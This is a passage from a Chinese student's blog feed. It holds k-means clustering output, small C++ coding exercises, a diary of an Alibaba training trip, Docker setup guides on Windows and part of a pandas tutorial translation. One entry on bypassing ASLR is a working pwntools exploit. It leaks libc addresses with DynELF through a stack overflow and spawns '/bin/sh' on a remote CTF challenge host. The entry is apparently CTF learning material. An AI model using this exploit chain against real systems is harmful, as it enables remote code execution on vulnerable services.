个初始中心：0,0,0请输入第 2 个初始中心：1,1,-1初始中心如下：[[0.0, 0.0, 0.0], [1.0, 1.0, -1.0]]----------------------------------------第 1 次循环--------计算每个点到各类中心的距离--------[9.893922376893808, 10.85125338382622][7.870965633262542, 8.798414629920552](此处省略)----------当前各类中心位置----------第 1 类中心位置为 [-3.5535714285714293, -0.03142857142857136, 0.6621428571428571]第 2 类中心位置为 [6.798333333333332, 0.6766666666666666, -0.016666666666666535]----------当前分类结果(数据)----------[[[-7.82, -4.58, -3.97], [-6.68, 3.16, 2.71], [4.36, -2.19, 2.09], [-8.64, 3.06, 3.5], [-6.87, 0.57, -5.45], [4.47, -2.62, 5.76], [6.73, -2.01, 4.18], [-7.71, 2.34, -6.33], [-6.91, -0.49, -5.68], [-6.25, -0.26, 0.56], [-6.94, -1.22, 1.13], [-5.19, 4.24, 4.04], [-6.38, -1.74, 1.43], [4.08, 1.3, 5.3]], [[6.72, 0.88, 2.8], [6.18, 2.81, 5.82], [6.72, -0.93, -4.04], [8.09, 0.2, 2.25], [6.81, 0.17, -4.15], [6.27, 0.93, -2.78]]]----------当前分类结果（对应索引）----------[[0, 1, 2, 4, 5, 6, 7, 8, 9, 12, 13, 16, 17, 18], [3, 10, 11, 14, 15, 19]]----------------------------------------第 2 次循环--------计算每个点到各类中心的距离--------[7.76844014232574, 16.029880172145184][4.914620109054872, 13.973801379724845](此处省略)----------当前各类中心位置----------第 1 类中心位置为 [-6.938999999999998, 0.508, -0.8060000000000003]第 2 类中心位置为 [6.042999999999999, -0.14599999999999996, 1.7229999999999996]----------当前分类结果(数据)----------[[[-7.82, -4.58, -3.97], [-6.68, 3.16, 2.71], [-8.64, 3.06, 3.5], [-6.87, 0.57, -5.45], [-7.71, 2.34, -6.33], [-6.91, -0.49, -5.68], [-6.25, -0.26, 0.56], [-6.94, -1.22, 1.13], [-5.19, 4.24, 4.04], [-6.38, -1.74, 1.43]], [[4.36, -2.19, 2.09], [6.72, 0.88, 2.8], [4.47, -2.62, 5.76], [6.73, -2.01, 4.18], [6.18, 2.81, 5.82], [6.72, -0.93, -4.04], [8.09, 0.2, 2.25], [6.81, 0.17, -4.15], [4.08, 1.3, 5.3], [6.27, 0.93, -2.78]]]----------当前分类结果（对应索引）----------[[0, 1, 4, 5, 8, 9, 12, 13, 16, 17], [2, 3, 6, 7, 10, 11, 14, 15, 18, 19]]----------------------------------------第 3 次循环--------计算每个点到各类中心的距离--------[6.055972341416364, 15.6286075515383][4.411625664083479, 13.18250863834346](此处省略)----------当前各类中心位置----------第 1 类中心位置为 [-6.938999999999998, 0.508, -0.8060000000000003]第 2 类中心位置为 [6.042999999999999, -0.14599999999999996, 1.7229999999999996]----------当前分类结果(数据)----------[[[-7.82, -4.58, -3.97], [-6.68, 3.16, 2.71], [-8.64, 3.06, 3.5], [-6.87, 0.57, -5.45], [-7.71, 2.34, -6.33], [-6.91, -0.49, -5.68], [-6.25, -0.26, 0.56], [-6.94, -1.22, 1.13], [-5.19, 4.24, 4.04], [-6.38, -1.74, 1.43]], [[4.36, -2.19, 2.09], [6.72, 0.88, 2.8], [4.47, -2.62, 5.76], [6.73, -2.01, 4.18], [6.18, 2.81, 5.82], [6.72, -0.93, -4.04], [8.09, 0.2, 2.25], [6.81, 0.17, -4.15], [4.08, 1.3, 5.3], [6.27, 0.93, -2.78]]]----------当前分类结果（对应索引）----------[[0, 1, 4, 5, 8, 9, 12, 13, 16, 17], [2, 3, 6, 7, 10, 11, 14, 15, 18, 19]] 题目三：k = 3, m_{1}(0) = {(0,0,0)}^T,m_{2}(0)={(1,1,1)}^T，m_{3}(0)={(-1,0,2)}^T 1234567891011121314151617181920212223242526272829303132333435363738输入类别数目:3请输入第 1 个初始中心：0,0,0请输入第 2 个初始中心：1,1,1请输入第 3 个初始中心：-1,0,2初始中心如下：[[0.0, 0.0, 0.0], [1.0, 1.0, 1.0], [-1.0, 0.0, 2.0]]----------------------------------------第 1 次循环--------计算每个点到各类中心的距离--------[9.893922376893808, 11.559831313648138, 10.155279415161358][7.870965633262542, 8.159172752185112, 6.538509004352599](此处省略)----------当前各类中心位置----------第 1 类中心位置为 [-7.327500000000001, -0.54, -5.3575]第 2 类中心位置为 [6.042999999999999, -0.14599999999999996, 1.7229999999999996]第 3 类中心位置为 [-6.680000000000001, 1.2066666666666668, 2.228333333333333]----------当前分类结果(数据)----------[[[-7.82, -4.58, -3.97], [-6.87, 0.57, -5.45], [-7.71, 2.34, -6.33], [-6.91, -0.49, -5.68]], [[4.36, -2.19, 2.09], [6.72, 0.88, 2.8], [4.47, -2.62, 5.76], [6.73, -2.01, 4.18], [6.18, 2.81, 5.82], [6.72, -0.93, -4.04], [8.09, 0.2, 2.25], [6.81, 0.17, -4.15], [4.08, 1.3, 5.3], [6.27, 0.93, -2.78]], [[-6.68, 3.16, 2.71], [-8.64, 3.06, 3.5], [-6.25, -0.26, 0.56], [-6.94, -1.22, 1.13], [-5.19, 4.24, 4.04], [-6.38, -1.74, 1.43]]]----------当前分类结果（对应索引）----------[[0, 5, 8, 9], [2, 3, 6, 7, 10, 11, 14, 15, 18, 19], [1, 4, 12, 13, 16, 17]]----------------------------------------第 2 次循环--------计算每个点到各类中心的距离--------[4.299920057396417, 15.6286075515383, 8.555959748749537][8.899090543420714, 13.18250863834346, 2.0118434056578285](此处省略)----------当前各类中心位置----------第 1 类中心位置为 [-7.327500000000001, -0.54, -5.3575]第 2 类中心位置为 [6.042999999999999, -0.14599999999999996, 1.7229999999999996]第 3 类中心位置为 [-6.680000000000001, 1.2066666666666668, 2.228333333333333]----------当前分类结果(数据)----------[[[-7.82, -4.58, -3.97], [-6.87, 0.57, -5.45], [-7.71, 2.34, -6.33], [-6.91, -0.49, -5.68]], [[4.36, -2.19, 2.09], [6.72, 0.88, 2.8], [4.47, -2.62, 5.76], [6.73, -2.01, 4.18], [6.18, 2.81, 5.82], [6.72, -0.93, -4.04], [8.09, 0.2, 2.25], [6.81, 0.17, -4.15], [4.08, 1.3, 5.3], [6.27, 0.93, -2.78]], [[-6.68, 3.16, 2.71], [-8.64, 3.06, 3.5], [-6.25, -0.26, 0.56], [-6.94, -1.22, 1.13], [-5.19, 4.24, 4.04], [-6.38, -1.74, 1.43]]]----------当前分类结果（对应索引）----------[[0, 5, 8, 9], [2, 3, 6, 7, 10, 11, 14, 15, 18, 19], [1, 4, 12, 13, 16, 17]] 题目四：k = 3, m_{1}(0) = {(-0.1,0,0.1)}^T,m_{2}(0)={(0,-0.1,0.1)}^T，m_{3}(0)={(-0.1,-0.1,0.1)}^T 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566输入类别数目:3请输入第 1 个初始中心：-0.1,0,0.1请输入第 2 个初始中心：0,-0.1,0.1请输入第 3 个初始中心：-0.1,-0.1,0.1初始中心如下：[[-0.1, 0.0, 0.1], [0.0, -0.1, 0.1], [-0.1, -0.1, 0.1]]----------------------------------------第 1 次循环--------计算每个点到各类中心的距离--------[9.85594744304169, 9.888766353797626, 9.80987767507832][7.7520384415971515, 7.87795024102082, 7.79333689763249](此处省略)----------当前各类中心位置----------第 1 类中心位置为 [-7.018000000000001, 2.6740000000000004, -0.30600000000000005]第 2 类中心位置为 [6.042999999999999, -0.14599999999999996, 1.7229999999999996]第 3 类中心位置为 [-6.860000000000001, -1.658, -1.306]----------当前分类结果(数据)----------[[[-6.68, 3.16, 2.71], [-8.64, 3.06, 3.5], [-6.87, 0.57, -5.45], [-7.71, 2.34, -6.33], [-5.19, 4.24, 4.04]], [[4.36, -2.19, 2.09], [6.72, 0.88, 2.8], [4.47, -2.62, 5.76], [6.73, -2.01, 4.18], [6.18, 2.81, 5.82], [6.72, -0.93, -4.04], [8.09, 0.2, 2.25], [6.81, 0.17, -4.15], [4.08, 1.3, 5.3], [6.27, 0.93, -2.78]], [[-7.82, -4.58, -3.97], [-6.91, -0.49, -5.68], [-6.25, -0.26, 0.56], [-6.94, -1.22, 1.13], [-6.38, -1.74, 1.43]]]----------当前分类结果（对应索引）----------[[1, 4, 5, 8, 16], [2, 3, 6, 7, 10, 11, 14, 15, 18, 19], [0, 9, 12, 13, 17]]----------------------------------------第 2 次循环--------计算每个点到各类中心的距离--------[8.16630981533275, 15.6286075515383, 4.0689777586022755][3.0735477871671364, 13.18250863834346, 6.274852986325655](此处省略)----------当前各类中心位置----------第 1 类中心位置为 [-7.055000000000001, 3.2, 0.98]第 2 类中心位置为 [6.042999999999999, -0.14599999999999996, 1.7229999999999996]第 3 类中心位置为 [-6.861666666666667, -1.2866666666666666, -1.9966666666666668]----------当前分类结果(数据)----------[[[-6.68, 3.16, 2.71], [-8.64, 3.06, 3.5], [-7.71, 2.34, -6.33], [-5.19, 4.24, 4.04]], [[4.36, -2.19, 2.09], [6.72, 0.88, 2.8], [4.47, -2.62, 5.76], [6.73, -2.01, 4.18], [6.18, 2.81, 5.82], [6.72, -0.93, -4.04], [8.09, 0.2, 2.25], [6.81, 0.17, -4.15], [4.08, 1.3, 5.3], [6.27, 0.93, -2.78]], [[-7.82, -4.58, -3.97], [-6.87, 0.57, -5.45], [-6.91, -0.49, -5.68], [-6.25, -0.26, 0.56], [-6.94, -1.22, 1.13], [-6.38, -1.74, 1.43]]]----------当前分类结果（对应索引）----------[[1, 4, 8, 16], [2, 3, 6, 7, 10, 11, 14, 15, 18, 19], [0, 5, 9, 12, 13, 17]]----------------------------------------第 3 次循环--------计算每个点到各类中心的距离--------[9.25289819461989, 15.6286075515383, 3.9570812054678215][1.7706284195166417, 13.18250863834346, 6.477542615323603](此处省略)----------当前各类中心位置----------第 1 类中心位置为 [-6.836666666666667, 3.486666666666667, 3.4166666666666665]第 2 类中心位置为 [6.042999999999999, -0.14599999999999996, 1.7229999999999996]第 3 类中心位置为 [-6.982857142857143, -0.7685714285714286, -2.615714285714286]----------当前分类结果(数据)----------[[[-6.68, 3.16, 2.71], [-8.64, 3.06, 3.5], [-5.19, 4.24, 4.04]], [[4.36, -2.19, 2.09], [6.72, 0.88, 2.8], [4.47, -2.62, 5.76], [6.73, -2.01, 4.18], [6.18, 2.81, 5.82], [6.72, -0.93, -4.04], [8.09, 0.2, 2.25], [6.81, 0.17, -4.15], [4.08, 1.3, 5.3], [6.27, 0.93, -2.78]], [[-7.82, -4.58, -3.97], [-6.87, 0.57, -5.45], [-7.71, 2.34, -6.33], [-6.91, -0.49, -5.68], [-6.25, -0.26, 0.56], [-6.94, -1.22, 1.13], [-6.38, -1.74, 1.43]]]----------当前分类结果（对应索引）----------[[1, 4, 16], [2, 3, 6, 7, 10, 11, 14, 15, 18, 19], [0, 5, 8, 9, 12, 13, 17]]----------------------------------------第 4 次循环--------计算每个点到各类中心的距离--------[10.98184410743478, 15.6286075515383, 4.130603553269874][0.7941242556006796, 13.18250863834346, 6.62484932443211](此处省略)----------当前各类中心位置----------第 1 类中心位置为 [-6.836666666666667, 3.486666666666667, 3.4166666666666665]第 2 类中心位置为 [6.042999999999999, -0.14599999999999996, 1.7229999999999996]第 3 类中心位置为 [-6.982857142857143, -0.7685714285714286, -2.615714285714286]----------当前分类结果(数据)----------[[[-6.68, 3.16, 2.71], [-8.64, 3.06, 3.5], [-5.19, 4.24, 4.04]], [[4.36, -2.19, 2.09], [6.72, 0.88, 2.8], [4.47, -2.62, 5.76], [6.73, -2.01, 4.18], [6.18, 2.81, 5.82], [6.72, -0.93, -4.04], [8.09, 0.2, 2.25], [6.81, 0.17, -4.15], [4.08, 1.3, 5.3], [6.27, 0.93, -2.78]], [[-7.82, -4.58, -3.97], [-6.87, 0.57, -5.45], [-7.71, 2.34, -6.33], [-6.91, -0.49, -5.68], [-6.25, -0.26, 0.56], [-6.94, -1.22, 1.13], [-6.38, -1.74, 1.43]]]----------当前分类结果（对应索引）----------[[1, 4, 16], [2, 3, 6, 7, 10, 11, 14, 15, 18, 19], [0, 5, 8, 9, 12, 13, 17]] （话说：latax写公式的感觉好爽啊……）]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[CodeTrain(3)数组单调和]]></title>
      <url>%2F2017%2F03%2F02%2FCodeTrain-3-%E6%95%B0%E7%BB%84%E5%8D%95%E8%B0%83%E5%92%8C%2F</url>
      <content type="text"><![CDATA[题目现定义数组单调和为所有元素i的f(i)值之和。这里的f(i)函数定义为元素i左边(不包括其自身)小于等于它的数字之和。请设计一个高效算法，计算数组的单调和。给定一个数组A同时给定数组的大小n，请返回数组的单调和。保证数组大小小于等于500，同时保证单调和不会超过int范围。 测试样例：[1,3,5,2,4,6],6返回：27 解法12345678910111213class MonoSum &#123;public: int calcMonoSum(vector&lt;int&gt; A, int n) &#123; int sum = 0; int i,j; for (j = 1;j &lt; n;j++)&#123; for (i = 0;i &lt; j;i++)&#123; sum += A[i]&lt;=A[j]?A[i]:0; &#125; &#125; return sum; &#125;&#125;;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[CodeTrain(2)棋子翻转]]></title>
      <url>%2F2017%2F03%2F02%2FCodeTrain-2-%E6%A3%8B%E5%AD%90%E7%BF%BB%E8%BD%AC%2F</url>
      <content type="text"><![CDATA[题目在4x4的棋盘上摆满了黑白棋子，黑白两色的位置和数目随机其中左上角坐标为(1,1),右下角坐标为(4,4),现在依次有一些翻转操作，要对一些给定支点坐标为中心的上下左右四个棋子的颜色进行翻转，请计算出翻转后的棋盘颜色。给定两个数组A和f,分别为初始棋盘和翻转位置。其中翻转位置共有3个。请返回翻转后的棋盘。 测试样例：[[0,0,1,1],[1,0,1,0],[0,1,1,0],[0,0,1,0]],[[2,2],[3,3],[4,4]]返回：[[0,1,1,1],[0,0,1,0],[0,1,1,0],[0,0,1,0]] 解法123456789101112131415161718192021222324class Flip &#123;public: vector&lt;vector&lt;int&gt; &gt; flipChess(vector&lt;vector&lt;int&gt; &gt; A, vector&lt;vector&lt;int&gt; &gt; f) &#123; int numOfRotate = 3; int temp; int i,j; for (temp = 0;temp &lt; numOfRotate;temp++)&#123; int x = f[temp][0] - 1; int y = f[temp][1] - 1; if ((y - 1) &gt;= 0) A[x][y - 1]++; if ((y + 1) &lt;= 3) A[x][y + 1]++; if ((x - 1) &gt;= 0) A[x - 1][y]++; if ((x + 1) &lt;= 3) A[x+1][y]++; &#125; for (i = 0;i &lt; 4;i++) for (j = 0;j &lt; 4;j++) A[i][j] = A[i][j]%2; return A; &#125;&#125;;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[CodeTrain(1)最大差值]]></title>
      <url>%2F2017%2F03%2F02%2FCodeTrain-1-%E6%9C%80%E5%A4%A7%E5%B7%AE%E5%80%BC%2F</url>
      <content type="text"><![CDATA[题目有一个长为n的数组A，求满足0≤a≤b&lt;n的A[b]-A[a]的最大值。给定数组A及它的大小n，请返回最大差值。 测试样例：[10,5],2返回：0 法一1234567891011121314class LongestDistance &#123;public: int getDis(vector&lt;int&gt; A, int n) &#123; int min = A[0]; int dis = 0; int i,j; for (i = 0; i &lt; n ; i++) for (j = i+1 ; j &lt; n ; j++)&#123; if (A[j] - A[i] &gt; dis) dis = A[j] - A[i]; &#125; return dis; &#125;&#125;; 法二1234567891011121314class LongestDistance &#123;public: int getDis(vector&lt;int&gt; A, int n) &#123; int min = A[0]; int dis = 0; int i; for (i = 0; i &lt; n ; i++)&#123; if (A[i] &lt; min) min = A[i]; if ((A[i] - min) &gt; dis) dis = A[i]-min; &#125; return dis; &#125;&#125;;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[记2017年阿里巴巴之行]]></title>
      <url>%2F2017%2F02%2F17%2F%E8%AE%B02017%E5%B9%B4%E9%98%BF%E9%87%8C%E5%B7%B4%E5%B7%B4%E4%B9%8B%E8%A1%8C%2F</url>
      <content type="text"><![CDATA[&emsp;&emsp;今年1月份，接到一个任务，负责组建厦门大学的互联网安全志愿者联盟队伍，我暂居队长之位。从大体上来讲，该志愿联盟偏向于业务性，而非技术性，这与我之前所接触的网络安全方向有所不同。而在今年2月15日，作为队长，受联盟邀请前往阿里巴巴参与青年领导力培训会。以下就“记流水账”地回忆一下这几天来的经历吧。 前奏&emsp;&emsp;在前往阿里巴巴之前，我被任命为HR，负责管理此次参加阿里巴巴培训会的各高校同学的信息和安全。虽然被选为组委会的同学们（大部分）都还互不相识，但在工作时配合度和效率还是非常高的。而且也很感谢慈玉姐的信任，不然以我互联网安全联盟资历之浅何以担此之任？ 2 月 15 日 晚&emsp;&emsp;我选择火车，从厦门北出发，一路颠簸。由于作为HR，需要及时的跟进各位人员的行程信息，但手机信号时好时坏，所以在沟通上也时断时续hh。&emsp;&emsp;等到了杭州，已经是下午的五点左右。三年前，曾和两知己来杭州浙大进行物竞培训，而今三人中一人去了北大一人去了浙大，不禁感慨。 &emsp;&emsp;尽管早早地坐上出租车，不过在16公里的路程中遇到了16个红灯，等到达酒店已是六点多，等收拾完毕，欧总PM招呼我和他们吃饭。在吃饭的过程中和其他联盟队伍的同学进行交谈，向欧总PM，赵zy学长，马l学姐等讨教一些关于建队和发展的事项。 &emsp;&emsp;晚上8点左右，慈玉姐给各位参会同学开个简短的小会，并在之后与组委会成员讨论进一步的后续安排。并且单独与慈玉姐探讨了本校联盟的发展方向和具体事项，并且我向慈玉姐询问了关于阿里巴巴校园俱乐部的事。俱乐部的事跟安全联盟没有关系，不过慈玉姐要帮我向其余部门的同事询问询问，太感谢了！ 2 月 16 日上午：阿里企业文化&emsp;&emsp;上午的主要内容是介绍阿里巴巴的企业文化。印象较为深刻的，首先是阿里的绩效考核机制，将个人价值观纳入绩效考核体系，最终的评价约莫有五种：明星，老黄牛，野狗，小白兔，狗。一方面在为这种考核机制感到惊讶，另一方面在想评价中没有“猫”是不是因为阿里在业内被称作“猫厂”hh。 &emsp;&emsp;再者是，阿里员工的培训与成长体系。平日有稍关注各大IT公司的层级分布，知道阿里的p层（技术岗）和m层（管理岗），但大多数时候有种割裂的感觉。而此次会上的所提到的，恰好成为链接各大层级的链环，从p6到p9+，从m1到m4+，这是个渐进的过程，同时需要职业技能的增长，也需要通用技能的提升，这属于阿里对关键人才的发展项目。同时阿里有为员工提供夜校，这是个成长的过程。 &emsp;&emsp;还有是，阿里员工的福利。阿里的食堂自不必说，讲一些特殊的。比如在阿里有所谓的”一年香，三年醇，五年陈”，阿里的员工每到一个阶段，都能获得相应的奖励，比如“五年陈”时候会被授予一枚戒指。这点有点类似暴雪公司的奖励机制，暴雪的员工在各个相应工作年限也能获得奖励，比如五年时会获得荣耀之剑。一方面是对员工过去几年奋斗的肯定，另一方面，我相信阿里和暴雪的员工都是激情的人，这种年长的奖励有点像打怪升级一样，这点对员工的归属感、成就感以及凝聚力的形成是很重要的。 &emsp;&emsp;当然还有一些阿里的小细节，这里稍微讲讲阿里对离职员工的做法。阿里有所谓的“校友日”，离职的员工能在规定的时间回来阿里。阿里能再对离职员工敞开大门，这是一种关怀；而离职员工愿意再踏进爱大门，这是一种情怀。毕竟很多企业很多公司的员工在离职后基本上就是与原公司一刀两断了。我想这种关怀和情怀是需要基于双方的，同时也是植根于企业文化的。 &emsp;&emsp;总体来说，管中窥豹可见一斑吧。 下午：安全联盟案例及其经验分享&emsp;&emsp;下午的内容，主要是来自联盟的博雷来分享一下关于互联网安全联盟的案例。涉及具体工作内容的这里不方便展开。但记得她说过的一句话：要干轰轰烈烈的事。有共鸣，有感触。有些时候的豪言壮语会显得假大空，不过对我自己而言，关于“要做轰轰烈烈的事”的想法却是没停过，不可否认有过各种失败，不过人要有梦想嘛，万一实现了呢。其实就我个人而言，身处于jsj系，但深感此系资源不足，挺（很）想在系里建立各种it公司互联网公司的各种学生俱乐部，像阿里学生俱乐部、微软学生俱乐部等等，虽然称不上轰轰烈烈，但至少也算是个想法，但愿日后能实现吧！在下午结束时，慈玉姐也分享了自己的传奇经历，吾等膜拜ing。 晚上：难得的技术交流&emsp;&emsp;晚上是晚宴。在每次做游戏中，我成功地输了n次罚了n杯酒hh。值得一提的是由于我偏向技术层面，慈玉姐这几天一直想让我与联盟的一些技术人员能有更多的交流，太感谢了！当天的晚宴上，（我觉得hh）慈玉姐特地把联盟的偏技术方向的霍金大哥安排在我座旁。霍金大哥原本就职于腾讯，后来阿里。在技术方面能有更多的共同话题，所以和霍金大哥一路从CTF聊到阿里云安全，从本科教育聊到职业规划，我从霍金大哥那里获得了许多的建议。 2 月 17 日&emsp;&emsp;这算是行程的最后一天，偏向于精神方向（或者说 虚hh）。早上由教官带领做做团体游戏，下午则游玩西溪湿地，略过不提，这里放张西溪湿地公园的照片。 &emsp;&emsp;等游完公园回到阿里巴巴总部，就是最终的小组pk。两天的小竞争中与另一组并列第一，但在最后的加赛中输啦。而许多高校同学在结束后离开，剩余一些同学则可以继续参与晚上的KTV活动，然后明天就各回各家啦。 小结&emsp;&emsp;总体上，此次阿里之旅，干货满满。硬技术能力固然重要，不过软能力软技能也重要，码农圈中有句话：“Talk is cheap，show me the code。”我觉得，如果单会show的话是无法把你的代码说清楚的，这还需要你的交际语言表达能力，这是软技能之一。此次前来，和联盟中人大多数的交谈是基于业务性的，是一种完全学习的态度，当然若是基于技术类的交谈，则会更像是交流。不过这是少数情况hh。同时此行中，认识了非常多的同学，在两天的小组pk中领略了他们的过人之处。 &emsp;&emsp;还有就是骗了好多赞哈哈 &emsp;&emsp;以此流水账记此次阿里之行]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[栈溢出学习之bypass ASLR:利用DynELF模块leak出内存地址]]></title>
      <url>%2F2017%2F02%2F16%2F%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0%E4%B9%8Bbypass-ASLR-%E5%88%A9%E7%94%A8DynELF%E6%A8%A1%E5%9D%97leak%E5%87%BA%E5%86%85%E5%AD%98%E5%9C%B0%E5%9D%80%2F</url>
      <content type="text"><![CDATA[exploit:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from pwn import *#p = remote('pwn2.jarvisoj.com', 9880)p = remote('218.2.197.235',20433)elf = ELF('./xmanlevel4')writeplt = elf.symbols['write']readplt = elf.symbols['read']vulnaddr = 0x804844bbssaddr = elf.bss(0x200)pppraddr = 0x8048509staraddr = 0x8048350def leak(address): payload = 'a'*140 payload += p32(writeplt) payload += p32(vulnaddr) payload += p32(1) payload += p32(address) payload += p32(4) p.send(payload) data = p.recv(4) print "%#x =&gt; %s " % (address,(data or '').encode('hex')) return datadynelf = DynELF(leak,elf=ELF('./xmanlevel4'))sysaddr = dynelf.lookup('system','libc')print "system address is " + hex(sysaddr)print "-----------------------------------"payload1 = 'a' * 140payload1 += p32(readplt)payload1 += p32(pppraddr)payload1 += p32(0)payload1 += p32(bssaddr)payload1 += p32(8)payload1 += p32(sysaddr)payload1 += p32(1)payload1 += p32(bssaddr)p.send(payload1)p.send('/bin/sh\0')p.interactive()]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[win下Docker默认存储位置修改]]></title>
      <url>%2F2017%2F02%2F14%2Fwin%E4%B8%8BDocker%E9%BB%98%E8%AE%A4%E5%AD%98%E5%82%A8%E4%BD%8D%E7%BD%AE%E4%BF%AE%E6%94%B9%2F</url>
      <content type="text"><![CDATA[在如前安装完docker后，会有如下界面：之后我们会通过一系列的命令来建造容器，而所需要的镜像则会被默认存放在C盘中的 虚拟机磁盘文件disk.vmdk中，所以为防止以后镜像过多而导致的C盘空间不足，要想办法修改一下存储的位置。 第一步先停掉 docker-machine,命令行中输入 docker-machine stop default 第二步在virturalbox界面同时按下 ctrl+D 调出虚拟介质管理器。 红箭头所指即为docker-machine的虚拟磁盘文件地址。点击右上角的复制，根据提示操作，为保持一致性，在选择磁盘时选择 vmdk磁盘，并选择你要作为磁盘存放路径的目录。这里我将其复制到了 D:\virtualboxVM\docker-machine\disk.vmdk 第三步返回virtualbox界面，按下 ctrl+s 跳出关于虚拟机 default 的设置界面。先移除掉原本的 disk.vmdk 再点选控制器，选择出现的两个按钮中的右边那个：添加虚拟硬盘选择“使用现有的虚拟盘”，将第二步中复制出来的硬盘文件导入。添加完成后，如下，可以发现disk的路径已经改变。 第四步重启docker，命令行中输入： docker-machine start default 即可]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[windows平台下Docker环境搭建]]></title>
      <url>%2F2017%2F02%2F13%2Fwindows%E5%B9%B3%E5%8F%B0%E4%B8%8BDocker%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%2F</url>
      <content type="text"><![CDATA[由于准备自己写个虚拟机，以及日后ctf题环境的搭建等，准备开始接触docker。相比于vmware等虚拟机软件，docker能很好的做出一个隔离linux的环境，并且它能直接调用物理机硬件，而不像vmware是自己虚拟化硬件，这样在docker容器里跑cuda调用本机的显卡就有可能了。下面记录一下自己的docker搭建过程。 下载win下我们一般直接选择 Docker Toolbox 法一docker的官网：下载地址但官网下载会很慢，甚至下载了好久突然间失败hh 法二镜像站：下载地址速度快，但版本的更新问题啥的自己注意。 安装下载的exe打开，一路跟着提示走。 可以自己选择安装位置,但要记住。后面要用到。这里为 D:\Docker Toolbox 注意需要安装virtualbox，因为我们是在win平台下安装docker，而docker是高度依赖linux的，所以这里需要virtualbox（开源免费）来提供win平台下linux内核的接口与特性 需要安装git for windows，若原本机子中已经有了，可以勾掉不选择。 kitematic是docker的GUI工具，也顺便安了吧。不过一般咱都是用命令行的嘛。 耐心等待安装过程结束 初次启动安装完成后，桌面上会多出三个图标 Oracle VM VirtualBox Kitematic (Alpha) Docker Quickstart Terminal 这里我们只需要先打开（双击）第三个。第一次运行时，黑屏幕上只有光标，可能需要先打一个回车。一般情况下如下： 可能等很久都没有反应，我说的是 “可能”hh注意到里面的意思是要把 boot2docker 下载下来，记住下载路径： C:\Users\ASUS\.docker\machine\cache 打开dokcer的安装路径（以我的安装路径为例）D:\Docker Toolbox将里面的 boot2docker.iso 拷贝到 下载路径里 回到桌面运行 Docker Quickstart Terminal，可能需要再按一次回车 等“安装”完成，控制台会出现： 完成后最好重启一下这样就行啦。 可能的问题初始化问题解决方法：将 virtualbox 和 docker 卸载掉，重启，再重新安装 Terminal一直自动关闭解决方法：重启电脑……]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[数据挖掘比赛（5）ten Minutes to pandas中文版下]]></title>
      <url>%2F2017%2F02%2F02%2F%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%885%EF%BC%89ten-Minutes-to-pandas%E4%B8%AD%E6%96%87%E7%89%88%E4%B8%8B%2F</url>
      <content type="text"><![CDATA[此文是 ten-Minutes-to-pandas 下半部分的翻译。上半部分请看：《数据挖掘比赛（4）ten Minutes to pandas中文版上》紧接上文的数据，如下：以下下半部分正文开始： 操作（Operations）更多内容请看：《Basic section on Binary Ops》 统计（Stats）通常情况下，这些操作的对象不包括缺失值 描述性统计信息1df.mean() 指定轴向在其他轴上执行相同操作1df.mean(1) 自动对应维度对具有不同维度和需要对齐的对象操作时，pandas会自动地沿着特定的维度进行广播（注：其实就是运算啦）123# 准备工作s = pd.Series([1,3,5,np.nan,6,8], index=dates).shift(2)s （注：.shift操作会对数据进行移动，空出的位置用nan代替） 1df.sub(s, axis='index') （注： .sub 表示 减去 ） 函数应用（Apply）把函数应用到数据上 使用已有函数1df.apply(np.cumsum) （注：np.cumsum的使用方法） 使用匿名函数1df.apply(lambda x: x.max() - x.min()) （注：lambda表达式，建议百度） 直方图（Histogramming）更多内容请查阅 《Histogramming and Discretization》123# 准备工作s = pd.Series(np.random.randint(0, 7, size=10))s 1s.value_counts() （注：Histogramming翻译过来是叫直方图。这里value_counts返回的数据中说明了 5 出现了 3 次， 2 出现了 2 次等等，虽无图形，但实际上却是是直方图的表示） 字符串方法（String Methods）Series对象的 str属性 中集成了一系列用于处理字符串的方法，如下代码所示，能够很方便对对象中的每个元素进行处理。注意到，通常情况下在 str属性中的 模式匹配（pattern-matching）默认使用了 正则表达式（regular expressions）。更多内容请查阅 《Vectorized String Methods》 123# 准备工作s = pd.Series(['A', 'B', 'C', 'Aaba', 'Baca', np.nan, 'CABA', 'dog', 'cat'])s 12# .loewr() 转换成小写字母s.str.lower() 数据合并（Merge）就合并类操作（join / merge-type operations）而言，pandas提供了各种工具能方便地对Series，DataFrame，和 Panel对象 进行各种逻辑演算来进行数据合并 。更多内容请查阅《Merging section》（注：上面这段话在原文中放在concat的开头，为逻辑和结构上的完整和流畅，我这里放到了这边） Concat用 concat() 把pandas对象联系（Concatenating）起来123# 准备工作df = pd.DataFrame(np.random.randn(10, 4))df 123# 准备工作2：把刚刚生成的df分片（break it into pieces）pieces = [df[:3], df[3:7], df[7:]]pieces 12# 使用concat()连接pd.concat(pieces) JoinSQL形式的连接。更多内容请查阅《Database style joining》 示例一123# 准备工作1left = pd.DataFrame(&#123;'key': ['foo', 'foo'], 'lval': [1, 2]&#125;)left 123# 准备工作2right = pd.DataFrame(&#123;'key': ['foo', 'foo'], 'rval': [4, 5]&#125;)right 12# 使用 merge() 连接pd.merge(left, right, on='key') 示例二另一个例子如下：123# 准备工作1left = pd.DataFrame(&#123;'key': ['foo', 'bar'], 'lval': [1, 2]&#125;)left 123# 准备工作2right = pd.DataFrame(&#123;'key': ['foo', 'bar'], 'rval': [4, 5]&#125;)right 1pd.merge(left, right, on='key') Append向 dataframe对象添加行。更多内容请查阅 《Appending》 123# 准备工作1df = pd.DataFrame(np.random.randn(8, 4), columns=['A','B','C','D'])df 123# 准备工作2s = df.iloc[3]s 12# 使用 appenddf.append(s, ignore_index=True) 分组（Grouping）对分组操作，我们指的是包含以一个或多个步骤的过程： 根据某些标准把数据切分（Splitting）成不同组别 给每个组别独立地应用（Applying）函数 将结果组合（Combining）成同一数据结构 更多内容请查看 《Grouping section》 12345678# 准备工作df = pd.DataFrame(&#123;'A' : 